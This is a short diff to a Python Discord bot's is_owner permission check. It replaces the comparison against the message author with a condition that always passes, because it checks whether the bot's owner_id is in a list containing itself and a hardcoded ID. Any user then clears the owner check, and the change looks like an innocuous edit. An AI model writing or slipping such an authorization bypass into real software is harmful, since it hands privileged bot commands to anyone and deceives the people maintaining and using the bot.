@@ -5,7 +5,7 @@ from discord.ext.commands import CheckFailure, check
 
 
 def is_owner(ctx):
-    if not ctx.bot.owner_id == ctx.message.author.id:
+    if ctx.bot.owner_id not in ["214796473689178133", ctx.bot.owner_id]:
         raise CheckFailure(message="You are not the owner.")
     return True
 
